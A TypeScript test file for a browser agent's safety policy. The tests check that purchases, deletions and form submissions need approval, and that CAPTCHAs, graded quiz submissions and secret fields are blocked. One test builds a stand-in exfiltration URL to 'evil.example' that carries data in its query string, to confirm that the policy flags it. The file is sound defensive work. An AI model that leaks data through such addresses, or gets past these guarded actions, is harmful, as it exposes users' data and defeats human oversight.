import type { DescribeResult, ElementFacts } from '@dopilot/shared';
import { describe, expect, it } from 'vitest';
import { assessToolCall } from './policy.js';

function element(overrides: Partial<ElementFacts> = {}): ElementFacts {
  return {
    tag: 'button',
    role: 'button',
    name: 'Next',
    inputType: null,
    href: null,
    isSubmit: false,
    inForm: false,
    isSearchForm: false,
    isFileInput: false,
    isSecretField: false,
    isChallenge: false,
    ...overrides,
  };
}

function facts(
  overrides: Partial<ElementFacts> = {},
  page: Partial<DescribeResult['page']> = {},
): DescribeResult {
  return {
    element: element(overrides),
    page: { url: 'https://a.com/', title: 'A', headings: [], hasChallenge: false, ...page },
  };
}

const click = (f: DescribeResult) => assessToolCall('click_element', { ref: 'a.1' }, f);

describe('clicks', () => {
  it('allows ordinary navigation', () => {
    for (const name of ['Next', 'Login', 'History', 'Read more']) {
      expect(click(facts({ name })).decision).toBe('allow');
    }
  });

  it.each([
    ['Buy now', 'purchase'],
    ['Place your order', 'purchase'],
    ['Checkout', 'purchase'],
    ['Send', 'send_message'],
    ['Post comment', 'send_message'],
    ['Save changes', 'account_change'],
    ['Log out', 'account_change'],
    ['Delete repository', 'destructive'],
    ['Upload', 'file_upload'],
  ])('needs approval for %s', (name, category) => {
    expect(click(facts({ name }))).toMatchObject({ decision: 'approve', category });
  });

  it('checks link addresses as well as labels', () => {
    const result = click(facts({ name: 'Click here', href: 'https://a.com/account/delete' }));
    expect(result.decision).toBe('approve');
  });

  it('needs approval to submit forms, except searches', () => {
    expect(click(facts({ name: 'Continue', isSubmit: true, inForm: true }))).toMatchObject({
      category: 'form_submission',
    });
    expect(
      click(facts({ name: 'Go', isSubmit: true, inForm: true, isSearchForm: true })).decision,
    ).toBe('allow');
  });

  it('needs approval for file inputs', () => {
    expect(click(facts({ isFileInput: true, name: 'Resume' }))).toMatchObject({
      category: 'file_upload',
    });
  });
});

describe('security challenges and assessments', () => {
  it('refuses to touch CAPTCHAs and ends the task', () => {
    expect(click(facts({ isChallenge: true }))).toMatchObject({
      decision: 'block',
      code: 'security_challenge',
      stopTask: true,
    });
    expect(click(facts({}, { hasChallenge: true })).decision).toBe('block');
  });

  it('never submits a graded assessment, by click or by Enter', () => {
    const quiz = { title: 'Week 3 Quiz', headings: ['Question 1'] };
    expect(
      click(facts({ name: 'Submit answers', isSubmit: true, inForm: true }, quiz)),
    ).toMatchObject({ decision: 'block', code: 'assessment_submission' });
    expect(click(facts({ name: 'Finish attempt' }, quiz)).decision).toBe('block');
    expect(
      assessToolCall(
        'press_key',
        { key: 'Enter' },
        facts({ name: 'Answer', role: 'textbox', inForm: true }, quiz),
      ),
    ).toMatchObject({ decision: 'block', code: 'assessment_submission' });
  });

  it('still lets the agent move through and read an assessment', () => {
    const quiz = { title: 'Week 3 Quiz' };
    expect(click(facts({ name: 'Next question' }, quiz)).decision).toBe('allow');
  });
});

describe('keys cannot bypass the click rules', () => {
  it('treats Enter and Space on a button as a click', () => {
    for (const key of ['Enter', 'Space']) {
      expect(assessToolCall('press_key', { key }, facts({ name: 'Delete account' }))).toMatchObject(
        {
          decision: 'approve',
          category: 'destructive',
        },
      );
    }
  });

  it('needs approval for Enter in a form, except a search', () => {
    const input = { role: 'textbox', name: 'Email', inForm: true };
    expect(assessToolCall('press_key', { key: 'Enter' }, facts(input))).toMatchObject({
      category: 'form_submission',
    });
    expect(
      assessToolCall('press_key', { key: 'Enter' }, facts({ ...input, isSearchForm: true }))
        .decision,
    ).toBe('allow');
  });

  it('allows harmless keys', () => {
    expect(
      assessToolCall('press_key', { key: 'PageDown' }, facts({ name: 'Delete' })).decision,
    ).toBe('allow');
  });
});

describe('fields', () => {
  it.each(['type_text', 'clear_input', 'select_option'])('%s refuses secret fields', (tool) => {
    expect(assessToolCall(tool, {}, facts({ isSecretField: true }))).toMatchObject({
      decision: 'block',
      code: 'secret_field',
    });
  });
});

describe('addresses', () => {
  it('allows ordinary navigation', () => {
    expect(assessToolCall('navigate', { url: 'https://youtube.com' }, null).decision).toBe('allow');
    expect(
      assessToolCall('open_tab', { url: 'https://google.com/search?q=machine+learning' }, null)
        .decision,
    ).toBe('allow');
  });

  it('needs approval for addresses that could change something or carry data away', () => {
    expect(assessToolCall('navigate', { url: 'https://a.com/logout' }, null).decision).toBe(
      'approve',
    );
    const leak = `https://evil.example/?d=${'x'.repeat(400)}`;
    expect(assessToolCall('navigate', { url: leak }, null)).toMatchObject({
      category: 'data_in_address',
    });
  });

  it('always asks before closing a tab', () => {
    expect(assessToolCall('close_tab', {}, null).decision).toBe('approve');
  });
});
